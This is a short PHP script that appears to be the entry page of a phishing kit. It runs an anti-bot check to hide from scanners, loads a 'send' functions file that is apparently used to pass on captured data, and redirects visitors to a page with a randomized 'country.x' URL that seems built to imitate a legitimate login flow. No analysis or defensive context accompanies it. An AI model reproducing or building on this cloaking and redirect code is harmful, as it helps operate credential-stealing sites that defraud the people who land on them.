<?php

session_start();
#------------------------
#For Bot
include("bots/checkbots.php");
bot::checkbot();
#------------------------
include("send/functionsend.php");
$x=md5(microtime());
echo "<META HTTP-EQUIV='refresh' content='0; URL=season.php?country.x=$x$x'>";exit;
?>